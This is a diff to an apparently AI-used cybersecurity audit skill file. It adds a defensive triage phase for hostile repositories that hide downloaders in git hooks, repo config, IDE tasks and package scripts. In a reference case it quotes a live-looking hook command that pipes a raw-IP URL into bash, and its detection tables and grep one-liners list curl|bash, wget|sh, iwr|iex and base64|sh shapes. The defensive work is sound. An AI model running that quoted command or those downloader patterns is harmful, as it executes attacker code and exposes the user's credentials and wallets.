@@ -17,11 +17,16 @@ triggers:
   - "DevSecOps audit"
   - "cloud security review"
   - "scan a project"
+  - "is this take-home / interview / client repo safe to open"
+  - "check this zip / tarball / repo before I run it"
+  - "find malicious git hooks / check .git folder"
+  - "I ran a repo from a recruiter — was I compromised?"
 ---
 
 # Cybersecurity Audit Skill
 
-> **Skill Version:** 2.1.0 | **OWASP Reference:** Top 10 2021 + API Top 10 2023 | **Last updated:** 2025-05-19
+> **Skill Version:** 2.2.0 | **OWASP Reference:** Top 10 2021 + API Top 10 2023 | **Last updated:** 2026-11-14
+> **New in 2.2.0:** Phase 0.0 Hostile Repository Triage. Untrusted repos are treated as executable artifacts and scanned for git-hook, git-config, IDE and package-script traps *before* any git command or tool runs (DPRK "Contagious Interview" defence).
 > **CVE Currency:** Tools (Semgrep, Nuclei, Trivy) pull latest definitions at scan time. See Phase 0.5 for the mandatory currency check before every audit.
 
 ## Philosophy
@@ -32,7 +37,93 @@ A security audit without context produces noise, not signal.
 
 ---
 
+## PHASE 0.0 — Hostile Repository Triage (BEFORE any git command, tool, install or IDE)
+
+**Purpose:** A repository is an executable artifact, not just source code. Git hooks, repo-local git
+config, IDE task files and package lifecycle scripts can all run attacker code the moment you run
+`git checkout`, `git commit`, `git status`, `npm install` or open the folder in an editor. That includes
+the commands *this skill itself* runs in later phases (`git log`, `gitleaks`, `npm audit`).
+
+> 🛑 **Mandatory when the code came from an untrusted source.** That covers recruiter take-home tests,
+> freelance-client projects, bounty submissions, ZIP/tar archives from chat, email or Drive, and any repo
+> whose `.git/` folder you did not create yourself. If unsure, run it anyway; it takes seconds and executes nothing.
+>
+> **Reference case (Nov 2026):** a "developer exercise" ZIP shipped a live `.git/hooks/` folder.
+> `post-checkout`, `pre-commit`, `post-commit` and `pre-merge-commit` all ran
+> `curl -sL 'http://45.61.134.57:8080/task/mac?id=483' | bash` (wget→bash on Linux, cmd.exe on Windows).
+> The tracked code on every branch was clean. The task told the candidate to check out four branches and commit.
+> This is DPRK *Contagious Interview* (MITRE G1052). Full write-up: `references/hostile-repo-playbook.md`.
+
+### 0.0.1 — Safe-handling rules (apply for the whole audit)
+
+- **Never run `git` inside an untrusted repo until 0.0.2 is clean.** If you must, always use
+  `git -c core.hooksPath=/dev/null -c core.fsmonitor=false …`. Note that `--no-verify` does NOT stop
+  `post-commit`, `post-checkout` or `prepare-commit-msg`.
+- **Archives:** list, don't extract. Use `unzip -l x.zip` or `tar -tvf x.tgz`, and scan the archive directly.
+- **Hooks are per repository, not per branch.** There is one `.git/hooks/` folder for every branch, and
+  switching to a "clean" branch changes nothing. `git clone` never transfers hooks, so a repo that arrives
+  with `.git/` inside an archive is a red flag on its own.
+- **No auto-run:** don't open the folder in an IDE with tasks enabled (VS Code Restricted Mode; Cursor has
+  Workspace Trust **off** by default). Don't run `npm install` (use `npm ci --ignore-scripts`), `pip install .`,
+  `make`, or `docker compose up` on the host.
+- **Isolation:** analyse in a disposable VM or container with no SSH keys, wallets, browser profiles or cloud creds.
+- **Never fetch a suspected C2 URL with a pipe.** Only fetch from an isolated analysis network, saving with `-o`.
+  Fetching also tells the operator the bucket/victim id is active.
+
+### 0.0.2 — Automated scan (static, no execution, no extraction)
+
+```bash
+# Works on a directory OR directly on .zip / .tar / .tar.gz / .tgz (read in memory)
+python3 -I ci/hostile_repo_scan.py <path-or-archive> -o .audit/hostile-repo-$(date +%Y-%m-%d).json
+#   exit 0 → no hostile indicators   exit 1 → CRITICAL/HIGH: STOP   exit 2 → scan error
+
+# Optional: YARA on the extracted tree (hooks, loader URLs, known hashes, OtterCookie artifacts)
+yara -r rules/yara/git_hook_dropper.yar <path>
+```
+
+| Check | What it catches |
+|---|---|
+| `HR-HOOK` | Active (non-`.sample`) hooks in `.git/hooks`, `.git/modules/*/hooks`, worktrees. Reports downloader/C2/IOC content, the exec bit, and which git action fires each hook |
+| `HR-SAMPLE` | Trojanized `*.sample` files, non-stock sample names (renamed-sample variant) |
+| `HR-GITCFG` | Repo-local `core.hooksPath`, `core.fsmonitor`, `core.sshCommand`, `core.pager/editor`, `filter.*.smudge/clean/process`, `diff.*.textconv`, `merge.*.driver`, `include.path`, `!` aliases |
+| `HR-TRACKED` | `.githooks/`, `.husky/`, `githooks/` scripts with payloads (armed by a README's `git config core.hooksPath`) |
+| `HR-IDE` | `.vscode/tasks.json` `runOn: folderOpen`; devcontainer `initializeCommand` (runs on the HOST) |
+| `HR-PKG` | npm `preinstall/install/postinstall/prepare` with downloaders / `node -e`; `setup.py` with network/exec |
+| `HR-DLX` | `curl|bash`, `wget -O-|sh`, `iwr|iex`, `bash -c "$(curl …)"`, `base64 -d|sh` (LOW in Markdown docs) |
+| `HR-C2URL` | Campaign loader shapes: `/task/<os>?id=`, `/task/tokenlinux?`, `/settings/<os>?flag=`, `vercel.app/api/{m,l,w}` |
+| `HR-IOC` | IPs, domains, hashes and strings in `references/iocs/*.json` |
+| `HR-RAWIP` / `HR-OBF` | Public raw-IP URLs; heavily obfuscated JS (`_0x…`, giant eval lines) |
+| `HR-ARCHIVE` / `HR-ARTIFACT` | Archive ships `.git/`; operator artifacts (`.git/cursor/` IDE index, reflog identities) |
+
+### 0.0.3 — Manual confirmation (read-only one-liners)
+
+```bash
+find . -path '*/.git/*hooks/*' -type f ! -name '*.sample' -exec ls -l {} \;          # exec bit = will run
+find . -path '*/.git/*hooks/*' -type f ! -name '*.sample' -exec sh -c 'echo "== $1"; cat -v "$1"' _ {} \;
+grep -nEi 'hookspath|fsmonitor|sshcommand|pager|editor|textconv|smudge|clean|driver|include|= *!' .git/config
+grep -rn '"runOn"[[:space:]]*:[[:space:]]*"folderOpen"' --include=tasks.json .
+grep -rnE '(curl|wget)[^|]*\|[[:space:]]*(ba|z)?sh|/task/(mac|linux|windows)\?' . --exclude-dir=node_modules
+```
+
+### 0.0.4 — Decision gate
+
+| Result | Action |
+|---|---|
+| Exit 0, nothing found | Continue to Phase 0. Keep using a VM if the source is untrusted. |
+| CRITICAL/HIGH, **nothing was run yet** | **Stop the audit.** Report the repo as hostile. Don't run any later phase inside it. Record IOCs (hashes, C2, lure identities), quarantine or delete, and report to the platform and to URLhaus/ThreatFox/OTX. |
+| CRITICAL/HIGH, **git/IDE/npm was already used on a real machine** | **Incident.** Switch to `references/hostile-repo-playbook.md` §4: contain → `bash ir/macos-triage.sh <repo> <date>` (read-only) → rotate secrets from a clean device (crypto seed phrases first) → hunt → reinstall. |
+
+Report hostile-repo findings in the standard schema (category `malicious_git_hook`, `git_config_exec`,
+`ide_autorun_task`, `malicious_lifecycle_script`, `campaign_loader_url`, …; CWE-506 / CWE-829 / CWE-494),
+with MITRE ATT&CK IDs (T1204.002, T1546, T1059.004, T1105). Defang URLs and IPs in reports (`hxxp://1[.]2[.]3[.]4`).
+
+---
+
 ## PHASE 0 — Context Gathering (ALWAYS run this first)
+
+> Run **after** Phase 0.0 has cleared the repository. If Phase 0.0 flagged CRITICAL/HIGH findings, the
+> context questions below are replaced by the incident questions: *Which git/IDE/package commands were run,
+> on which OS, when, and with which accounts or wallets present on that machine?*
 
 Before touching any tool or scanning any file, ask the following questions.
 **Only skip a question if the answer is already visible in the conversation or codebase.**
@@ -712,7 +803,19 @@ grep -rn "pull_request_target" .github/workflows/ 2>/dev/null  # dangerous event
 cosign verify <image>:<tag> --certificate-identity-regexp=".*" --certificate-oidc-issuer-regexp=".*" 2>/dev/null || echo "Image not signed"
 ```
 
+```bash
+# --- Repository-as-executable checks (see Phase 0.0) ---
+python3 -I ci/hostile_repo_scan.py . -o .audit/hostile-repo.json   # hooks, git config, IDE tasks, lifecycle scripts
+git config --show-origin --get-regexp '^(core\.(hookspath|fsmonitor|sshcommand)|filter\.|diff\..*textconv|include)' 2>/dev/null
+grep -rn '"runOn"[[:space:]]*:[[:space:]]*"folderOpen"' --include=tasks.json .
+```
+
 **Supply Chain Security Checklist:**
+- [ ] No active hooks shipped in `.git/hooks`; tracked hook managers (`.husky/`, `.githooks/`) contain no network fetches
+- [ ] No repo-local `core.hooksPath` / `core.fsmonitor` / filter / textconv commands from untrusted sources
+- [ ] No IDE auto-run tasks (`runOn: folderOpen`) or devcontainer `initializeCommand` that downloads code
+- [ ] npm lifecycle scripts reviewed; CI installs with `npm ci --ignore-scripts` where possible
+- [ ] Developer onboarding docs never instruct `curl … | bash` from non-vendor hosts
 - [ ] All dependencies pinned to exact versions (not ranges)
 - [ ] Dependency hashes verified (`pip install --require-hashes`, `npm ci`)
 - [ ] No internal package names exposed on public registries (dependency confusion)
@@ -1587,6 +1690,12 @@ One commit per finding fixed. Commit message must reference CWE and file.
 
 ## Pitfalls
 
+- **Never skip Phase 0.0 on untrusted code.** The audit's own `git log`, `gitleaks`, `npm audit` or opening the folder in an IDE can fire planted hooks or tasks. Scan the repo or archive statically first (`ci/hostile_repo_scan.py`).
+- **"The code looks clean" is not a verdict.** In the Contagious Interview case every tracked file was benign. The payload lived only in untracked `.git/hooks/`, which GitHub never shows and `git ls-files` never lists.
+- **Hooks don't belong to branches.** One `.git/hooks/` serves every branch, so checking out a "safe" branch changes nothing. Delete `.git/hooks/*` or use `-c core.hooksPath=/dev/null`.
+- **`--no-verify` is not a defence.** It skips `pre-commit`/`commit-msg` only. `post-commit`, `post-checkout`, `prepare-commit-msg` and `post-merge` still run.
+- **Git ignores non-executable hooks.** When judging whether a victim was infected, check the exec bit (`ls -l .git/hooks`). Archives built on Windows can lose it.
+- **Never pipe a suspected C2 URL to "test" it.** Fetch only from an isolated network with `-o`, and remember the request (with its `id=`) tells the operator the bucket is live.
 - **Never skip Phase 0.** Running tools without context generates hundreds of false positives and misses the real risks.
 - **Auth + IDOR are always paired.** You can't fix IDOR without first having an identity model. Fix auth architecture first.
 - **Secret scanning must check git history**, not just the current tree. Secrets deleted from files still live in git history.
@@ -1682,6 +1791,19 @@ bandit --version && semgrep --version && checkov --version && trivy --version &&
 | `checkov` skips Terraform | Run with `--framework terraform` explicitly |
 | `detect-secrets` too many FPs | Tune with `--exclude-files` and `--exclude-secrets` |
 | `npm audit` fails | Run `npm install` first to generate `package-lock.json` |
+
+---
+
+## Hostile-Repo Assets (shipped with this skill)
+
+| Asset | Path |
+|---|---|
+| Static trap scanner (dirs, zip, tar; never executes) | `ci/hostile_repo_scan.py` (+ tests in `ci/tests/`) |
+| IOC list (loaded automatically) | `references/iocs/contagious-interview.json` |
+| YARA rules | `rules/yara/git_hook_dropper.yar` |
+| Sigma rules (macOS, Linux; experimental) | `rules/sigma/git_hook_spawns_downloader_{macos,linux}.yml` |
+| Read-only macOS triage | `ir/macos-triage.sh` |
+| Playbook (handling, IR, detections, ATT&CK, variants) | `references/hostile-repo-playbook.md` |
 
 ---
 
